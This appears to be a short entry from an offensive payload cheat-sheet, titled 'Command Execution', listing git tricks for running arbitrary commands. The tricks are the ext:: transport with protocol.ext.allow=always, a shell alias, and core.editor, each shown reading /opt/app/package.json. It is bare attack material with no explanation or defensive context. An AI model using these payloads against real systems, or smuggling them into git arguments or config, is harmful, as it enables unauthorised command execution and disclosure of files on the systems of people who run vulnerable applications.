# Command Execution

## Git

```
git -c protocol.ext.allow=always clone ext::sh -c cat% /opt/app/package.json% >&2
git config alias.tmp=!cat /opt/app/package.json
# git tmp
git config core.editor=cat /opt/app/package.json
# git editor
```

